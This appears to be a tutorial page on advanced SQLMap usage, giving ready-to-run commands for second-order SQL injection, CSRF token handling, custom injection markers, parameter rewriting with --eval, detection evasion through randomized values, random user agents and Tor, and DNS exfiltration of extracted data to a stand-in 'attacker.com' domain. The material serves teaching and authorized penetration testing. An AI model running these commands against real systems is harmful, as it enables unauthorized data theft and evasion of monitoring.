---
title: 'Advanced SQLMap Usage'
description: 'Second-order injection, CSRF token handling, custom injection markers, eval scripts, randomizing parameters, and other advanced SQLMap techniques.'
icon: material/cog-play
tags:
  - sqlmap
  - advanced
  - csrf
  - second-order
---

# Advanced SQLMap Usage

This section covers the techniques that separate beginners from experts. These are the features you need when standard scanning fails.

---

## Second-Order SQL Injection

In **second-order injection**, your payload is:

1. **Stored** in the database through one request (e.g., registration form)
2. **Executed** when a different feature queries that stored data (e.g., admin dashboard)

The injection point and the vulnerable page are **different URLs**.

### Configuring SQLMap for Second-Order

```bash title="Using --second-url"
sqlmap -r registration_request.txt \
  --second-url="http://target.com/admin/users" \
  --batch
```

**How it works:**

1. SQLMap injects payloads into the registration request (from the `-r` file)
2. After each injection, SQLMap visits `--second-url` to check for the effect
3. If the second URL's response changes based on the payload, injection is confirmed

### Using a Full Second Request File

For complex second-order scenarios where the result page needs specific headers:

```bash title="Using --second-req"
sqlmap -r inject_request.txt \
  --second-req=check_request.txt \
  --batch
```

### Real-World Example

Imagine a web app where:

- **Registration page** (`POST /register`) stores the username
- **Profile page** (`GET /profile`) displays it with a vulnerable query

```http title="inject_request.txt (Registration)"
POST /register HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=testuser&email=test@test.com&password=Test123!
```

```http title="check_request.txt (Profile Page)"
GET /profile HTTP/1.1
Host: target.com
Cookie: session=abc123
```

```bash
sqlmap -r inject_request.txt \
  -p username \
  --second-req=check_request.txt \
  --batch
```

---

## CSRF Token Handling

Many modern applications include **CSRF tokens** in forms. SQLMap can automatically extract and include fresh tokens with each request.

### Automatic CSRF Token Extraction

```bash title="Basic CSRF handling"
sqlmap -r request.txt \
  --csrf-token="csrf_token" \
  --batch
```

SQLMap will:

1. Parse the response for a parameter named `csrf_token`
2. Extract its value
3. Include the fresh token in subsequent requests

### With a Separate Token URL

If the CSRF token is served from a different endpoint:

```bash title="CSRF token from separate URL"
sqlmap -r request.txt \
  --csrf-token="csrf_token" \
  --csrf-url="http://target.com/get-token" \
  --batch
```

### CSRF Token in Headers

If the CSRF token goes in a header (common with SPAs):

```http title="request.txt"
POST /api/search HTTP/1.1
Host: target.com
X-CSRF-Token: abc123
Content-Type: application/json

{"query":"test"}
```

```bash
sqlmap -r request.txt --csrf-token="X-CSRF-Token" --batch
```

---

## Custom Injection Markers

The `*` marker tells SQLMap exactly where to inject. This is essential for non-standard injection points.

### REST API Path Parameters

```bash title="Inject into a URL path segment"
sqlmap -u "http://target.com/api/users/1*/profile" --batch
```

### JSON Values

```http title="request.txt"
POST /api/search HTTP/1.1
Host: target.com
Content-Type: application/json

{"filters":{"category":"electronics*","min_price":0},"page":1}
```

### HTTP Headers

```http title="request.txt"
GET /dashboard HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1*
User-Agent: Mozilla/5.0*
Cookie: user_id=1*
```

### Inside XML/SOAP Bodies

```http title="request.txt"
POST /soap/service HTTP/1.1
Host: target.com
Content-Type: text/xml

<request><userId>1*</userId></request>
```

---

## Eval: Preprocessing Parameters

The `--eval` flag lets you execute Python code to modify parameters before each request. This is incredibly powerful for:

### Generating Hashed Parameters

Some applications send both a value and its hash for integrity checking:

```bash title="Compute MD5 hash of the 'id' parameter"
sqlmap -u "http://target.com/page?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" \
  --eval="import hashlib; hash=hashlib.md5(id.encode()).hexdigest()" \
  --batch
```

Every time SQLMap modifies `id`, it automatically recomputes the `hash` parameter.

### Generating HMAC Signatures

```bash title="Compute HMAC signature"
sqlmap -u "http://target.com/api?data=test&sig=abc" \
  --eval="import hmac,hashlib; sig=hmac.new(b'secret',data.encode(),hashlib.sha256).hexdigest()" \
  --batch
```

### Base64 Encoding Parameters

```bash title="Base64 encode the parameter"
sqlmap -u "http://target.com/page?data=dGVzdA==" \
  --eval="import base64; data=base64.b64encode(data.encode()).decode()" \
  --batch
```

### Generating Timestamps

```bash title="Add current timestamp"
sqlmap -u "http://target.com/api?query=test&ts=1234567890" \
  --eval="import time; ts=str(int(time.time()))" \
  --batch
```

---

## Randomizing Parameters

Some applications detect automated scanning by noticing repeated parameter values. SQLMap can randomize non-injectable parameters:

```bash title="Randomize the 'session_id' parameter"
sqlmap -u "http://target.com/page?id=1&session_id=abc123" \
  --randomize=session_id \
  --batch
```

This changes `session_id` to a random value with each request while testing `id` for injection.

---

## Custom HTTP Methods

Some APIs use non-standard HTTP methods:

```bash title="Use PUT method"
sqlmap -u "http://target.com/api/user/1" --method=PUT --data='{"name":"test"}' --batch
```

```bash title="Use PATCH method"
sqlmap -u "http://target.com/api/user/1" --method=PATCH --data='{"email":"test@test.com"}' --batch
```

---

## Handling Anti-CSRF and Session Tokens Together

Complex applications may require both:

```bash title="Full anti-CSRF + session management"
sqlmap -r request.txt \
  --csrf-token="csrf_token" \
  --csrf-url="http://target.com/form" \
  --safe-url="http://target.com/dashboard" \
  --safe-freq=5 \
  --random-agent \
  --delay=1 \
  --batch
```

This:

1. Fetches a fresh CSRF token from `/form` before each request
2. Checks the session is alive at `/dashboard` every 5 requests
3. Uses a random User-Agent for each request
4. Adds a 1-second delay between requests

---

## Using SQLMap with Proxied Applications

### Through Burp Suite (Monitor Traffic)

```bash
sqlmap -r request.txt --proxy="http://127.0.0.1:8080" --batch
```

Watch SQLMap's traffic in real-time in Burp's HTTP History.

### Through a SOCKS Proxy (Pivoting)

When the target is on an internal network accessible through a pivot:

```bash
sqlmap -r request.txt --proxy="socks5://127.0.0.1:1080" --batch
```

### Through Tor (Anonymization)

```bash
sqlmap -r request.txt \
  --tor \
  --tor-type=SOCKS5 \
  --tor-port=9050 \
  --check-tor \
  --batch
```

---

## DNS Exfiltration

When in-band and blind techniques are too slow, use out-of-band DNS exfiltration:

```bash title="DNS exfiltration (requires Burp Collaborator or custom DNS)"
sqlmap -r request.txt --dns-domain="attacker.com" --batch
```

**How it works:**

1. SQLMap injects payloads that cause the database to make DNS lookups
2. The extracted data is embedded in the DNS query (e.g., `password123.attacker.com`)
3. Your DNS server logs the queries and recovers the data

!!! info "Setup Requirements"

    You need:

    - A domain you control (`attacker.com`)
    - A DNS server logging all queries
    - The database server must be able to make outbound DNS requests

---

## Importing Results from Other Scanners

### From Burp Suite

```bash title="Parse Burp proxy log"
sqlmap -l burp_proxy_log.txt --batch --scope=".*target\.com.*"
```

### From WebScarab

```bash
sqlmap -l webscarab_log.txt --batch
```

### From OWASP ZAP

Export the session as HAR format, then use the request file approach.

---

## SQLMap API (Programmatic Usage)

SQLMap includes a REST API for integration with other tools:

```bash title="Start the API server"
sqlmapapi.py -s
```

```bash title="Connect the client"
sqlmapapi.py -c
```

```python title="Python Integration Example"
import requests

# Start a new scan
api_url = "http://127.0.0.1:8775"
task = requests.get(f"{api_url}/task/new").json()
task_id = task["taskid"]

# Set scan options
requests.post(f"{api_url}/option/{task_id}/set", json={
    "url": "http://target.com/page?id=1",
    "batch": True,
    "dbs": True
})

# Start the scan
requests.post(f"{api_url}/scan/{task_id}/start")

# Check status
status = requests.get(f"{api_url}/scan/{task_id}/status").json()
print(status)

# Get results
data = requests.get(f"{api_url}/scan/{task_id}/data").json()
print(data)
```
